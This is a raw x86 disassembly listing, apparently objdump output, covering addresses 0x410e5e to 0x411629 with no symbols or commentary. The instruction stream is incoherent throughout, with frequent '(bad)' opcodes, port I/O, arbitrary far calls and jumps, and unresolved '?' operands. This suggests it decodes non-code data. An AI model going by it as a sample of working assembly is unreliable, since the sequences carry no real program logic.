  410e5e:	fiadd  DWORD PTR [ecx+ebp*2+0x7b]
  410e62:	and    bl,BYTE PTR [ecx+esi*2]
  410e65:	(bad)  
  410e66:	xor    cl,BYTE PTR [eax+0x5c]
  410e69:	mov    ecx,DWORD PTR [ebx+0x1d36f517]
  410e6f:	std    
  410e70:	inc    ebp
  410e71:	adc    esp,DWORD PTR ds:0x8f016468
  410e77:	jle    0x410ef6
  410e79:	jnp    0x410e78
  410e7b:	dec    esi
  410e7c:	inc    ebp
  410e7d:	test   DWORD PTR [edi-0x9f12fff],eax
  410e83:	mov    cl,0x9f
  410e85:	loope  0x410ea3
  410e87:	dec    ecx
  410e88:	shl    edi,0x4
  410e8b:	rcr    DWORD PTR [edi],cl
  410e8d:	in     al,dx
  410e8e:	mov    ecx,0x28125d6a
  410e93:	xor    eax,0xfb8ff3d1
  410e98:	mov    edi,0xd11bc6b5
  410e9d:	aam    0x5b
  410e9f:	loopne 0x410eb5
  410ea1:	lods   eax,DWORD PTR ds:[esi]
  410ea2:	fcomp  QWORD PTR [ebx+0x23fdc027]
  410ea8:	and    eax,0x17331871
  410ead:	mov    al,0x95
  410eaf:	push   0xffffffca
  410eb1:	test   al,0xb6
  410eb3:	pop    ebx
  410eb4:	cld    
  410eb5:	dec    esi
  410eb6:	stos   BYTE PTR es:[edi],al
  410eb7:	mov    bl,0x1a
  410eb9:	jne    0x410f21
  410ebb:	in     eax,dx
  410ebc:	int3   
  410ebd:	in     eax,dx
  410ebe:	jne    0x410f00
  410ec0:	call   DWORD PTR [ebp-0x3e]
  410ec3:	popa   
  410ec4:	sbb    bl,BYTE PTR [eax-0x2b]
  410ec7:	enter  0x72a,0x11
  410ecb:	into   
  410ecc:	pop    esi
  410ecd:	add    cl,BYTE PTR [ecx-0x41]
  410ed0:	retf   
  410ed1:	mov    bl,BYTE PTR [edi-0x42c2afa2]
  410ed7:	add    DWORD PTR [esi],esi
  410ed9:	xchg   ebx,eax
  410eda:	inc    esp
  410edb:	out    0x0,al
  410edd:	test   DWORD PTR [ebx],0x3a33f09f
  410ee3:	or     DWORD PTR [edx+0x32],esp
  410ee6:	outs   dx,DWORD PTR ds:[esi]
  410ee7:	pop    esp
  410ee8:	sahf   
  410ee9:	inc    ecx
  410eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410eeb:	xchg   esi,eax
  410eec:	add    dl,dh
  410eee:	cmp    al,0x81
  410ef0:	add    dl,BYTE PTR [edi-0x390e0b46]
  410ef6:	mov    al,0x80
  410ef8:	je     0x410f32
  410efa:	push   ds
  410efb:	mov    ecx,0x196d0509
  410f00:	repz jg 0x410f68
  410f03:	dec    ebp
  410f04:	fadd   st,st(0)
  410f06:	push   es
  410f07:	enter  0x1212,0x37
  410f0b:	out    0x24,al
  410f0d:	test   DWORD PTR [si+0x2827],0xe7ff4c49
  410f16:	sahf   
  410f17:	inc    ebp
  410f18:	sbb    cl,BYTE PTR [ecx-0xb5ac95e]
  410f1e:	stos   DWORD PTR es:[edi],eax
  410f1f:	inc    esp
  410f20:	arpl   WORD PTR ds:[ecx+0x28],bp
  410f24:	shl    BYTE PTR [ebx],0xc4
  410f27:	and    ch,BYTE PTR [edi]
  410f29:	sbb    al,0x65
  410f2b:	bswap  edi
  410f2d:	mov    dh,0x0
  410f2f:	xor    edx,DWORD PTR [ebp+0x46]
  410f32:	lods   eax,DWORD PTR ds:[esi]
  410f33:	sar    DWORD PTR [ecx-0x3c],1
  410f36:	cmp    al,0x6c
  410f38:	mov    esi,0xaaf63d5e
  410f3d:	mov    cl,0xe3
  410f3f:	nop
  410f40:	sbb    BYTE PTR [ebx-0x65f12ca6],cl
  410f46:	mov    al,0xfd
  410f48:	fsub   DWORD PTR [edx]
  410f4a:	(bad)  
  410f4b:	in     al,0xa9
  410f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f4e:	pop    eax
  410f4f:	aaa    
  410f50:	and    eax,0x4c74ef85
  410f55:	lahf   
  410f56:	(bad)  
  410f58:	les    esp,FWORD PTR [ecx-0x7]
  410f5b:	out    0x82,al
  410f5d:	mov    dl,0x1e
  410f5f:	inc    esi
  410f60:	mov    dh,BYTE PTR [ebp+0x1d]
  410f63:	js     0x410fd3
  410f65:	dec    ecx
  410f66:	repnz es push edi
  410f69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f6a:	clc    
  410f6b:	aam    0x72
  410f6d:	mov    eax,ds:0xb5024972
  410f72:	push   ecx
  410f73:	jp     0x410fc2
  410f75:	pop    esi
  410f76:	je     0x410f58
  410f78:	xchg   ecx,eax
  410f79:	fmul   st,st(4)
  410f7b:	bound  esi,QWORD PTR ds:0x18962238
  410f81:	push   esp
  410f82:	jge    0x410f1f
  410f84:	das    
  410f85:	mov    dl,0x7
  410f87:	inc    ebx
  410f88:	sbb    dh,cl
  410f8a:	mov    dh,0x80
  410f8c:	fwait
  410f8d:	(bad)  
  410f8e:	mov    bl,0x82
  410f90:	inc    ebp
  410f91:	and    eax,0xc94d7a16
  410f96:	add    eax,0xcafbc28
  410f9b:	rol    BYTE PTR [eax-0x28cc3e46],0x1d
  410fa2:	mov    al,0x1d
  410fa4:	mov    al,bl
  410fa6:	jb     0x410f79
  410fa8:	sbb    ebp,ebp
  410faa:	jge    0x410fd7
  410fac:	out    0x7c,eax
  410fae:	cdq    
  410faf:	mov    BYTE PTR [edx-0x77],cl
  410fb2:	push   ds
  410fb3:	cmp    edi,edx
  410fb5:	mov    ch,0x3b
  410fb7:	push   esp
  410fb8:	push   es
  410fb9:	push   esp
  410fba:	push   ss
  410fbb:	xchg   ecx,eax
  410fbc:	cmp    ch,BYTE PTR [edi-0x44785235]
  410fc2:	call   0x4046:0x568f79b5
  410fc9:	jmp    0xd3ee:0xf03355d2
  410fd0:	mov    ecx,0x9ccdbbc5
  410fd5:	leave  
  410fd6:	sbb    bl,BYTE PTR [ebp+eax*4-0x1ffde251]
  410fdd:	adc    dl,BYTE PTR [edx+0x23]
  410fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fe1:	sub    BYTE PTR [esi+0x6e6a6934],0x32
  410fe8:	aam    0xf8
  410fea:	enter  0xfcfc,0xcb
  410fee:	(bad)  
  410fef:	fild   WORD PTR [esi+0x77e0dd8]
  410ff5:	xchg   BYTE PTR [ecx],bh
  410ff7:	pop    es
  410ff8:	sbb    al,0xca
  410ffa:	mov    DWORD PTR [ebp-0x3a],eax
  410ffd:	retf   
  410ffe:	int3   
  410fff:	mov    fs,WORD PTR [edi+0x32c900a4]
  411005:	mov    ecx,0xdb3ee388
  41100a:	(bad)  
  41100c:	int    0xd7
  41100e:	das    
  41100f:	and    edi,DWORD PTR [edi]
  411011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411012:	xchg   DWORD PTR [edx],edi
  411014:	rcl    DWORD PTR [ebx+0x5edfaf1f],1
  41101a:	lock mov ebx,0x813b0216
  411021:	js     0x41107b
  411023:	xor    BYTE PTR [esi+edx*4+0x4d],0xe
  411028:	fidiv  DWORD PTR [eax]
  41102a:	fld    DWORD PTR [edi]
  41102c:	lea    esp,[edi]
  41102e:	inc    edx
  41102f:	icebp  
  411030:	inc    edx
  411031:	scas   eax,DWORD PTR es:[edi]
  411032:	push   cs
  411033:	or     ebx,ebp
  411035:	jp     0x41106d
  411037:	dec    eax
  411038:	pop    ds
  411039:	pusha  
  41103a:	mov    esp,0x7d922b5a
  41103f:	jbe    0x4110a8
  411041:	pop    ecx
  411042:	clc    
  411043:	ins    DWORD PTR es:[edi],dx
  411044:	mov    ebx,0xc1b25299
  411049:	in     al,dx
  41104a:	imul   edx,DWORD PTR [ebx+ebx*4+0x492558c4],0x8afd7333
  411055:	adc    edx,esp
  411057:	nop
  411058:	sub    cl,BYTE PTR [ecx+0x5e]
  41105b:	jl     0x4110bb
  41105d:	pop    ecx
  41105e:	xor    DWORD PTR [eax+0x20],0x8dca7559
  411065:	pop    edx
  411066:	fdiv   QWORD PTR [esi]
  411068:	mov    eax,ds:0xbd2f1fbd
  41106d:	icebp  
  41106e:	jno    0x4110ab
  411070:	daa    
  411071:	add    eax,0x82916d45
  411076:	std    
  411077:	or     BYTE PTR [ebx],cl
  411079:	jp     0x4110d2
  41107b:	test   DWORD PTR [esi+edx*4],0xfc1da5b7
  411082:	call   0xc50f:0xf59140d4
  411089:	hlt    
  41108a:	pop    edi
  41108b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41108c:	cli    
  41108d:	stc    
  41108e:	ss icebp 
  411090:	mov    bl,0xa4
  411092:	push   es
  411093:	add    DWORD PTR [ebp+esi*8+0x6c59b2da],ebp
  41109a:	dec    esp
  41109b:	cmp    bh,BYTE PTR [esp+esi*2+0xe5eac5f]
  4110a2:	mov    cl,0x17
  4110a4:	or     eax,0xca354e4b
  4110a9:	sbb    al,0xd9
  4110ab:	call   0x603a:0xa21d82e9
  4110b2:	jns    0x411055
  4110b4:	inc    ecx
  4110b5:	sub    DWORD PTR [eax+edi*2-0x7e],ecx
  4110b9:	call   0x6f89a85a
  4110be:	sti    
  4110bf:	pop    eax
  4110c0:	outs   dx,DWORD PTR ds:[esi]
  4110c1:	add    eax,0xdbf16b51
  4110c6:	shl    ecx,cl
  4110c8:	mov    esi,0xfa3f7105
  4110cd:	out    0x14,al
  4110cf:	xor    eax,DWORD PTR [eax]
  4110d1:	shl    BYTE PTR [ecx+0x3ed6bc95],cl
  4110d7:	pushf  
  4110d8:	sbb    DWORD PTR fs:[eax-0x47f4a36f],0xc18c244e
  4110e3:	adc    eax,0x8fda3c96
  4110e8:	fsub   QWORD PTR [ebp-0x10]
  4110eb:	mov    ah,0xaf
  4110ed:	jbe    0x41115f
  4110ef:	inc    eax
  4110f0:	data16 (bad) 
  4110f2:	inc    cl
  4110f4:	or     DWORD PTR [esi],esi
  4110f6:	push   ecx
  4110f7:	into   
  4110f8:	cmc    
  4110f9:	out    dx,al
  4110fa:	jmp    0x1b3d:0x7fb5e1f3
  411101:	cld    
  411102:	cmp    eax,0x51ba12de
  411107:	jg     0x4110c1
  411109:	or     bh,BYTE PTR [esi+0x60b7ea69]
  41110f:	pop    ss
  411110:	jmp    0x280d:0xcc85d6de
  411117:	jmp    0x41114a
  411119:	lahf   
  41111a:	aaa    
  41111b:	aam    0xd8
  41111d:	adc    eax,0x7fc0e0e
  411122:	repz sbb ch,BYTE PTR es:[edi-0x7d]
  411127:	cmp    eax,DWORD PTR [esp+ebx*2+0x66d6283a]
  41112e:	push   0x5ff3aa52
  411133:	push   edi
  411134:	rol    DWORD PTR [ebx],0x5a
  411137:	out    0xc7,eax
  411139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41113a:	fild   WORD PTR [ecx+eiz*1+0x568946bf]
  411141:	mov    cl,0x3c
  411143:	or     eax,0x48783d63
  411148:	and    BYTE PTR [eax-0x66],ch
  41114b:	les    ecx,FWORD PTR [esi+0x383ca8b4]
  411151:	and    al,0xb8
  411153:	xor    dl,ch
  411155:	das    
  411156:	or     edi,DWORD PTR [edx-0x4f8d5c14]
  41115c:	sahf   
  41115d:	and    BYTE PTR [edx*1-0xff86cd5],bl
  411164:	adc    al,0x2c
  411166:	mov    edi,DWORD PTR [ecx-0x72d45595]
  41116c:	inc    BYTE PTR [esi+edi*4+0x14ca6ea5]
  411173:	pop    ds
  411174:	xchg   ebp,eax
  411175:	add    DWORD PTR ds:0x5d953aa5,esi
  41117b:	mov    esi,0x1b7abb38
  411180:	add    DWORD PTR cs:[ebp+0x11316d8b],edx
  411187:	pusha  
  411188:	loope  0x4111de
  41118a:	repz loope 0x4111b6
  41118d:	je     0x4111fd
  41118f:	jmp    0xb07b:0x92fdf3b6
  411196:	push   edi
  411197:	jnp    0x411180
  411199:	bswap  ebp
  41119b:	push   cs
  41119c:	jae    0x4111aa
  41119e:	jl     0x4111ac
  4111a0:	scas   al,BYTE PTR es:[edi]
  4111a1:	loopne 0x4111ea
  4111a3:	repz (bad) 
  4111a5:	hlt    
  4111a6:	adc    al,ch
  4111a8:	and    BYTE PTR [edi+0x55],al
  4111ab:	outs   dx,BYTE PTR ds:[esi]
  4111ac:	test   BYTE PTR [ebp+0x5f],bl
  4111af:	inc    ecx
  4111b0:	cmp    al,0xac
  4111b2:	and    DWORD PTR [ecx],esp
  4111b4:	sub    DWORD PTR [edx-0x4d689aa1],ecx
  4111ba:	xor    al,BYTE PTR [ebp+0x35]
  4111bd:	jp     0x411202
  4111bf:	fwait
  4111c0:	push   ss
  4111c1:	mov    dl,0x25
  4111c3:	sub    esp,DWORD PTR [eax+edx*4+0xc]
  4111c7:	and    eax,0xcf236c3c
  4111cc:	inc    ecx
  4111cd:	pop    ecx
  4111ce:	mov    ebx,0x7e80addb
  4111d3:	jp     0x41123f
  4111d5:	test   BYTE PTR [ecx-0x1a],bh
  4111d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111d9:	int3   
  4111da:	ror    BYTE PTR [ecx-0x4],0xc8
  4111de:	or     DWORD PTR [esi],esp
  4111e0:	cmc    
  4111e1:	xor    ebp,DWORD PTR [edi-0x7b4397bf]
  4111e7:	ret    0xe197
  4111ea:	or     DWORD PTR [ecx+0x7c],ecx
  4111ed:	imul   ebp,DWORD PTR [edi-0x5f],0x7b2fc1f6
  4111f4:	jb     0x41118d
  4111f6:	fsubr  QWORD PTR [ebx]
  4111f8:	lock sub DWORD PTR [edx-0xabfa1e1],edx
  4111ff:	pop    edi
  411200:	dec    ebx
  411201:	jl     0x41119d
  411203:	and    DWORD PTR [edx+0x4f7db3de],eax
  411209:	jb     0x411227
  41120b:	jo     0x411259
  41120d:	enter  0x97b4,0xb3
  411211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411212:	cld    
  411213:	fsub   DWORD PTR [ecx]
  411215:	or     ebx,DWORD PTR [ecx+0x17e2e90c]
  41121b:	repnz test BYTE PTR [edi-0x2e87ddd4],ah
  411222:	push   cs
  411223:	dec    ebp
  411224:	xlat   BYTE PTR ds:[ebx]
  411225:	cs loop 0x411236
  411228:	add    al,0xdd
  41122a:	call   0xc9c44b78
  41122f:	sti    
  411230:	inc    esp
  411231:	inc    edi
  411232:	call   DWORD PTR [esi-0x18]
  411235:	outs   dx,BYTE PTR ds:[esi]
  411236:	data16 lahf 
  411238:	fnstcw WORD PTR [ebx-0x3a]
  41123b:	cdq    
  41123c:	add    ecx,edx
  41123e:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  411240:	(bad)  
  411241:	jmp    0x6e8d:0xe0a6c2b1
  411248:	xchg   BYTE PTR [edi],dh
  41124a:	retf   
  41124b:	cmp    ebx,DWORD PTR [edi+0x3]
  41124e:	mov    eax,ds:0xee8d57f4
  411253:	ins    BYTE PTR es:[edi],dx
  411254:	jae    0x41129a
  411256:	and    ebx,DWORD PTR [esi-0xe3058b4]
  41125c:	jae    0x41128a
  41125e:	jmp    0x4112d3
  411260:	adc    BYTE PTR [ebx+0x7a],bh
  411263:	imul   DWORD PTR [edx+0x76]
  411266:	rcr    DWORD PTR [ebp-0x45],1
  411269:	mov    ebp,0x335709a5
  41126e:	mov    bh,0x65
  411270:	mov    ecx,0xaffee760
  411275:	test   eax,0x404a6dc3
  41127a:	repnz repz fnstcw WORD PTR fs:[eax+0x4c4df304]
  411283:	jns    0x41126e
  411285:	aad    0xf7
  411287:	and    bl,BYTE PTR [esi]
  411289:	sbb    al,0xc5
  41128b:	ins    DWORD PTR es:[edi],dx
  41128c:	xor    al,0xce
  41128e:	ror    DWORD PTR [esi-0x37387867],1
  411294:	dec    ebp
  411295:	psubb  mm3,QWORD PTR [eax]
  411298:	inc    edx
  411299:	xor    al,0x6
  41129b:	xor    edx,esp
  41129d:	test   DWORD PTR [esi+0x78],eax
  4112a0:	pop    ebp
  4112a1:	pop    ebx
  4112a2:	pop    edi
  4112a3:	and    ebx,DWORD PTR [ecx-0x7be6bf38]
  4112a9:	dec    BYTE PTR ss:0x8fbe26c7
  4112b0:	mov    bl,0xeb
  4112b2:	mov    edi,0xfd3a94bc
  4112b7:	hlt    
  4112b8:	aaa    
  4112b9:	jo     0x4112bf
  4112bb:	int    0x21
  4112bd:	mov    esp,DWORD PTR [ecx]
  4112bf:	lds    edx,FWORD PTR [ebx+0x42]
  4112c2:	fld    TBYTE PTR [esi+0x4d]
  4112c5:	add    dh,ch
  4112c7:	cmp    DWORD PTR [eax],esi
  4112c9:	or     esi,esi
  4112cb:	jno    0x411305
  4112cd:	push   edx
  4112ce:	jo     0x4112ad
  4112d0:	scas   al,BYTE PTR es:[edi]
  4112d1:	cmp    BYTE PTR [eiz*1-0x5f27ca1e],dh
  4112d8:	mov    ebx,DWORD PTR [edi]
  4112da:	pop    ebx
  4112db:	and    ecx,DWORD PTR [ebx+0x38]
  4112de:	aam    0x77
  4112e0:	repz jbe 0x41127d
  4112e3:	mov    ebx,0xbc8a7b50
  4112e8:	sub    DWORD PTR [eax+ebp*2+0x71],esp
  4112ec:	pushf  
  4112ed:	int    0x39
  4112ef:	mov    ecx,0x5a5f0889
  4112f4:	clc    
  4112f5:	outs   dx,DWORD PTR ds:[esi]
  4112f6:	fs inc edi
  4112f8:	mov    dh,0x24
  4112fa:	popf   
  4112fb:	xchg   ebp,eax
  4112fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112fd:	ins    BYTE PTR es:[edi],dx
  4112fe:	jle    0x41135e
  411300:	xchg   edi,eax
  411301:	mov    bl,0x53
  411303:	outs   dx,DWORD PTR ds:[esi]
  411304:	push   ebp
  411305:	dec    esp
  411306:	lock dec eax
  411308:	stos   DWORD PTR es:[edi],eax
  411309:	fcmovnu st,st(1)
  41130b:	pop    edi
  41130c:	aaa    
  41130d:	push   es
  41130e:	mov    edx,0xcb9c8d1c
  411313:	jmp    DWORD PTR [ebp-0x1d2d4f8b]
  411319:	jle    0x411330
  41131b:	cwde   
  41131c:	xacquire xchg DWORD PTR [edx+0x5b],esp
  411320:	push   cs
  411321:	xor    cl,bl
  411323:	adc    al,0xbe
  411325:	inc    edx
  411326:	push   0xffffffd9
  411328:	fimul  WORD PTR [ecx-0x13d496fc]
  41132e:	add    eax,esi
  411330:	and    eax,0x1df24f4c
  411335:	add    dh,0x88
  411338:	sti    
  411339:	mov    ecx,0xa8a6525b
  41133e:	rol    BYTE PTR [edx-0x3],cl
  411341:	cmp    ch,BYTE PTR cs:0x3a2ff3bd
  411348:	mov    dh,0x1e
  41134a:	or     ebp,ecx
  41134c:	pop    esi
  41134d:	rcr    DWORD PTR [ebx+0x7abcc31c],cl
  411353:	push   cs
  411354:	pop    esp
  411355:	arpl   WORD PTR [eax],si
  411357:	add    cl,dl
  411359:	loopne 0x411320
  41135b:	mov    cl,0x2c
  41135d:	inc    esp
  41135e:	push   ecx
  41135f:	cli    
  411360:	sub    cl,dl
  411362:	pop    DWORD PTR [ebp-0xf355b72]
  411368:	fs loop 0x41132c
  41136b:	test   DWORD PTR [ebx-0x7e],esi
  41136e:	mov    ch,0x4c
  411370:	ret    0xa161
  411373:	add    ah,BYTE PTR [ecx]
  411375:	adc    esp,DWORD PTR [esi+0x5d8d610]
  41137b:	push   esi
  41137c:	(bad)  
  41137d:	cmp    edx,DWORD PTR [esi+0x9ce15fc]
  411383:	xor    DWORD PTR [ebx+eiz*2+0x60ab51da],ebp
  41138a:	adc    BYTE PTR ds:0x7290f68d,0x71
  411391:	ds scas al,BYTE PTR es:[edi]
  411393:	dec    edi
  411394:	neg    cl
  411396:	mov    eax,ds:0x6a420462
  41139b:	sti    
  41139c:	lods   al,BYTE PTR ds:[esi]
  41139d:	push   ebx
  41139e:	jp     0x411324
  4113a0:	call   DWORD PTR [ecx]
  4113a2:	mov    ds:0x2ddff5d0,al
  4113a7:	dec    ebp
  4113a8:	xchg   ebx,eax
  4113a9:	pop    edx
  4113aa:	cs pop ss
  4113ac:	and    ebp,DWORD PTR [esi+0x5d]
  4113af:	nop
  4113b0:	lds    edx,FWORD PTR [ebp+ebp*8+0x5e]
  4113b4:	arpl   WORD PTR [ebx],dx
  4113b6:	xchg   edi,eax
  4113b7:	add    BYTE PTR [edx+0x6488aab0],bh
  4113bd:	mov    ebp,0x4a645514
  4113c2:	aas    
  4113c3:	aam    0xef
  4113c5:	adc    al,0xba
  4113c7:	es sbb bl,bh
  4113ca:	add    edi,DWORD PTR [edx+eiz*4]
  4113cd:	push   ss
  4113ce:	lahf   
  4113cf:	mov    esp,0x9dff83db
  4113d4:	fs inc esi
  4113d6:	or     ebx,DWORD PTR [ebp+0x841f46f]
  4113dc:	fcom   DWORD PTR [ecx+ebp*8-0x25]
  4113e0:	imul   edi,DWORD PTR [ecx-0xa36deb8],0x14
  4113e7:	cdq    
  4113e8:	sbb    esp,0x72
  4113eb:	call   FWORD PTR [esp+ebx*4]
  4113ee:	(bad)  
  4113ef:	sbb    ebx,DWORD PTR [edi-0x5e]
  4113f2:	ret    
  4113f3:	bound  esp,QWORD PTR ds:0xb0192351
  4113f9:	in     al,0x25
  4113fb:	mov    eax,0x85b7804d
  411400:	or     DWORD PTR [eax+edi*4+0x7a],0xffffffc2
  411405:	push   ebp
  411406:	sub    ebp,eax
  411408:	mov    esi,0xd5fbeac2
  41140d:	popf   
  41140e:	pop    ds
  41140f:	ja     0x411400
  411411:	shl    DWORD PTR [esp+ebp*2+0x21],0xe
  411416:	call   0xd946:0x695dcc72
  41141d:	mov    BYTE PTR [edi-0x42f4e4ae],0x5b
  411424:	rcl    BYTE PTR [ebx+0x59],1
  411427:	adc    BYTE PTR [edi+0x18a2d7b8],ah
  41142d:	mov    dl,0x31
  41142f:	das    
  411430:	out    dx,eax
  411431:	pusha  
  411432:	in     al,0xd4
  411434:	push   ebx
  411435:	dec    esp
  411436:	das    
  411437:	xchg   edx,eax
  411438:	adc    eax,0xe51add42
  41143d:	or     al,0x2a
  41143f:	in     al,dx
  411440:	fbstp  TBYTE PTR [edi+0x77ba1536]
  411446:	test   dh,dl
  411448:	push   eax
  411449:	bound  ebx,QWORD PTR [ebp+0x26f65cef]
  41144f:	test   al,0x3b
  411451:	lods   eax,DWORD PTR ds:[esi]
  411452:	mov    ecx,0x2d3ab414
  411457:	retf   
  411458:	or     eax,0x1d91de09
  41145d:	int    0x25
  41145f:	stos   DWORD PTR es:[edi],eax
  411460:	jg     0x4113f1
  411462:	out    0x7e,eax
  411464:	xlat   BYTE PTR ds:[ebx]
  411465:	mov    dl,0xc5
  411467:	cld    
  411468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411469:	dec    ebx
  41146a:	and    eax,0xa4baa731
  41146f:	cs add edi,edx
  411472:	pop    ss
  411473:	sar    BYTE PTR [edx],0x79
  411476:	jb     0x41144e
  411478:	fdivr  QWORD PTR [esi+0x4ba6176a]
  41147e:	inc    esi
  41147f:	imul   edx,DWORD PTR [ebp+ebp*1+0x20637d7c],0xb
  411487:	mov    edx,0xadbf4a8
  41148d:	icebp  
  41148e:	fwait
  41148f:	xchg   edx,eax
  411490:	cli    
  411491:	push   0xe8d60002
  411496:	or     DWORD PTR [esi-0x50],ebx
  411499:	cmp    DWORD PTR [esi],edi
  41149b:	mov    al,0xea
  41149d:	pop    edx
  41149e:	fnstsw WORD PTR [edx+0x47]
  4114a1:	inc    esi
  4114a2:	idiv   DWORD PTR ds:0xd8aebdda
  4114a8:	dec    eax
  4114a9:	outs   dx,DWORD PTR ds:[esi]
  4114aa:	in     eax,0x37
  4114ac:	adc    BYTE PTR [edx],cl
  4114ae:	cmp    al,0xf
  4114b0:	test   dh,al
  4114b2:	popa   
  4114b3:	adc    al,0x83
  4114b5:	cmp    DWORD PTR [ebx],ecx
  4114b7:	call   0xc7f2:0x80183775
  4114be:	add    bh,BYTE PTR [esi]
  4114c0:	sub    BYTE PTR [eax+0x18],dl
  4114c3:	ret    0x654a
  4114c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114c8:	lahf   
  4114c9:	xor    BYTE PTR [ecx-0x67],ch
  4114cc:	in     al,0xd8
  4114ce:	(bad)  
  4114cf:	fucomip st,st(3)
  4114d1:	push   edi
  4114d2:	aad    0xee
  4114d4:	dec    esi
  4114d5:	aad    0x86
  4114d7:	popf   
  4114d8:	mov    al,0x8f
  4114da:	retf   
  4114db:	push   ebp
  4114dc:	pushf  
  4114dd:	xchg   esi,eax
  4114de:	js     0x4114d1
  4114e0:	sub    al,0x9d
  4114e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114e3:	js     0x41146a
  4114e5:	scas   al,BYTE PTR es:[edi]
  4114e6:	cmp    BYTE PTR [esi+0x18],ah
  4114e9:	fdivr  QWORD PTR ss:[edi+ebx*2-0x3a]
  4114ee:	popf   
  4114ef:	pop    ss
  4114f0:	and    ecx,eax
  4114f2:	jp     0x411510
  4114f4:	cmp    DWORD PTR [edi-0x69],eax
  4114f7:	shl    BYTE PTR [eax],0x91
  4114fa:	shl    DWORD PTR [esi+eax*8-0x7c],cl
  4114fe:	sbb    BYTE PTR ss:0x829965b5,bl
  411505:	lods   eax,DWORD PTR ds:[esi]
  411506:	in     eax,dx
  411507:	or     bh,dh
  411509:	outs   dx,BYTE PTR ds:[esi]
  41150a:	mov    esp,0x81e4d213
  41150f:	adc    edx,DWORD PTR [ebp+0x3b]
  411512:	repz test dl,ch
  411515:	std    
  411516:	push   ds
  411517:	mov    dh,0xe7
  411519:	cmp    BYTE PTR [esi+eiz*2+0x338aa560],dh
  411520:	or     BYTE PTR [edi+edi*4+0x37],al
  411524:	sub    edx,DWORD PTR ds:0x16410285
  41152a:	loopne 0x411551
  41152c:	sar    ebx,0x3
  41152f:	ror    BYTE PTR [edi],cl
  411531:	ret    0xd23b
  411534:	scas   eax,DWORD PTR es:[edi]
  411535:	neg    dh
  411537:	mov    ?,edx
  411539:	stos   DWORD PTR es:[edi],eax
  41153a:	in     eax,0xc1
  41153c:	imul   esi,DWORD PTR [ecx],0xffffff85
  41153f:	cmp    eax,0x2b0fffaa
  411544:	in     al,dx
  411545:	add    BYTE PTR [edx+eiz*1+0x5fe6d1ea],dh
  41154c:	or     BYTE PTR [ecx],bh
  41154e:	mov    ecx,0xeb3bbde0
  411553:	(bad)  
  411554:	mov    esi,0x898ef179
  411559:	adc    cl,BYTE PTR [esi-0x12]
  41155c:	daa    
  41155d:	mov    edi,0x7378df40
  411562:	arpl   WORD PTR [edi+ecx*4-0x1e5cfde4],dx
  411569:	hlt    
  41156a:	pop    esi
  41156b:	daa    
  41156c:	inc    ebx
  41156d:	outs   dx,DWORD PTR ds:[esi]
  41156e:	test   al,0x1
  411570:	pop    es
  411571:	or     DWORD PTR [esi-0x2e],ebp
  411574:	push   edx
  411575:	pop    eax
  411576:	mov    edx,0xc481579f
  41157b:	mov    edi,0x515213b1
  411580:	pop    edx
  411581:	arpl   WORD PTR [eax+0x46],bx
  411584:	jle    0x411563
  411586:	lahf   
  411587:	and    DWORD PTR [edi-0x9],edi
  41158a:	or     DWORD PTR [edi-0x37],ebx
  41158d:	pop    ds
  41158e:	xchg   edi,eax
  41158f:	sar    dl,1
  411591:	outs   dx,DWORD PTR ds:[esi]
  411592:	jnp    0x4115ff
  411594:	(bad)  
  411596:	adc    al,0xa9
  411598:	loope  0x411545
  41159a:	jmp    0x74f96432
  41159f:	fninit 
  4115a1:	out    0xe9,al
  4115a3:	xchg   ebp,eax
  4115a4:	loope  0x4115b2
  4115a6:	xlat   BYTE PTR ds:[ebx]
  4115a7:	xchg   BYTE PTR [esi],bl
  4115a9:	ja     0x4115fb
  4115ab:	sub    ah,bh
  4115ad:	cld    
  4115ae:	mov    BYTE PTR [edi+0x26],bl
  4115b1:	jmp    0x411558
  4115b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115b4:	mov    ?,WORD PTR [esi-0x78813b78]
  4115ba:	loope  0x41153f
  4115bc:	jno    0x4115cc
  4115be:	retf   0x158
  4115c1:	arpl   WORD PTR [ebp+0x52debb7d],bx
  4115c7:	dec    eax
  4115c8:	pop    edx
  4115c9:	rcr    BYTE PTR [ebx-0x7501dbbd],cl
  4115cf:	add    BYTE PTR [ecx+ebp*2],dh
  4115d2:	push   edi
  4115d3:	add    al,BYTE PTR [ebx]
  4115d5:	fs dec ebx
  4115d7:	xchg   ebx,eax
  4115d8:	shl    BYTE PTR [edx-0xbbd98d8],1
  4115de:	push   ecx
  4115df:	pusha  
  4115e0:	ret    
  4115e1:	idiv   DWORD PTR [edx]
  4115e3:	call   eax
  4115e5:	repnz shl esi,0xab
  4115e9:	retf   0x831
  4115ec:	test   esp,edi
  4115ee:	fbstp  TBYTE PTR [ebx-0x719182be]
  4115f4:	stos   BYTE PTR es:[edi],al
  4115f5:	lods   eax,DWORD PTR ds:[esi]
  4115f6:	jge    0x411636
  4115f8:	and    bl,BYTE PTR [edi-0x10]
  4115fb:	sub    dh,bl
  4115fd:	shr    ebx,0x36
  411600:	sbb    dl,BYTE PTR [eax-0x51]
  411603:	mov    eax,ds:0xd7ac3cc7
  411608:	ss adc bl,0x66
  41160c:	lods   eax,DWORD PTR ds:[esi]
  41160d:	push   ebx
  41160e:	jbe    0x411616
  411610:	push   es
  411611:	ja     0x4115e3
  411613:	out    0x47,eax
  411615:	mov    eax,0x8f78b9a8
  41161a:	sti    
  41161b:	(bad)  
  41161c:	lods   eax,DWORD PTR ds:[esi]
  41161d:	or     eax,0x92437c9d
  411622:	arpl   WORD PTR [ebp-0x2720553],bx
  411628:	nop
  411629:	push   DWORD PTR cs:[edx+0x67]
